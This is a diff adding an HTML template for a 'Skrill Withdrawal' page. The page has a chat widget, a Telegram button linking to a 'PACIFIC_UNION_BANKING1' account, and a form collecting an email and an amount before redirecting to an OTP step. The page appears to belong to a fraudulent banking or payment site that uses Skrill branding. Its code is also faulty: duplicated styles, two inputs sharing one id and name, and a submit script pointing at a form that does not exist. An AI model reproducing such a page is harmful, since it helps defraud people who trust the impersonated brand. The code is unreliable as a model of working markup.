@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Skrill Withdrawal</title>
+      <!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '60bcd766b3d111d8981d2933c94e036c631cdb4e';
+window.smartsupp||(function(d) {
+	var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+	s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+	c.type='text/javascript';c.charset='utf-8';c.async=true;
+	c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+  <style type="text/css" media="all">
+  body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background-color: navy;
+}
+
+.telegram-icon {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background-color: #0088cc;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    animation: float 2s infinite;
+    cursor: pointer;
+    transition: transform 0.3s;
+}
+
+.telegram-icon img {
+    width: 70%;
+    height: 70%;
+}
+
+.telegram-icon:hover {
+    transform: scale(1.1);
+}
+
+@keyframes float {
+    0%, 100% {
+        transform: translateY(0);
+    }
+    50% {
+        transform: translateY(-10px);
+    }
+}
+
+.container {
+  max-width: 400px;
+  margin: 50px auto;
+  padding: 20px;
+  background-color: purple;
+  border-radius: 10px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  text-align: center;
+}
+
+.telegram-icon {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background-color: #0088cc;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    animation: float 2s infinite;
+    cursor: pointer;
+    transition: transform 0.3s;
+}
+
+.telegram-icon img {
+    width: 70%;
+    height: 70%;
+}
+
+.telegram-icon:hover {
+    transform: scale(1.1);
+}
+
+@keyframes float {
+    0%, 100% {
+        transform: translateY(0);
+    }
+    50% {
+        transform: translateY(-10px);
+    }
+}
+
+.skrill-logo {
+  width: 100px;
+  border-radius: 14px;
+  height: 100px;
+  background-image: url("static/images/skrill.png" );
+  margin: 0 auto 20px;
+  color: #fff;
+}
+
+h1 {
+  margin-bottom: 20px;
+  color: #fff;
+}
+
+.withdrawal-form {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+label {
+  margin-bottom: 10px;
+}
+
+input {
+  padding: 10px;
+  width: 100%;
+  margin-bottom: 20px;
+}
+
+button {
+  padding: 10px 20px;
+  background-color: #4CAF50;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  transition: background-color 0.3s;
+}
+
+button:hover {
+  background-color: #45a049;
+}
+
+  </style>
+</head>
+<body>
+<div class="telegram-icon">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
+    </div>
+  <div class="container">
+    <div class="skrill-logo"></div>
+    <h1>Withdraw to Skrill</h1>
+    <form action="{% url 'OTP' %}" class="withdrawal-form">
+      <input type="email" id="amount" name="amount" placeholder="Enter Email">
+
+      <input type="number" id="amount" name="amount" placeholder="Enter amount">
+      <button onclick="submitForm()" type="submit">Withdraw</button>
+    </form>
+  </div>
+
+
+<script>
+document.querySelector('.telegram-icon').addEventListener('click', function() {
+    window.open('https://t.me/PACIFIC_UNION_BANKING1', '_blank');
+});
+        function submitForm() {
+            // Perform any form validation here if needed
+
+            // Submit the form
+            document.getElementById("your_form").submit();
+
+            // Redirect to another page
+            window.location.href = "{% url 'OTP' %}";
+        }
+    </script>
+</body>
+</html>
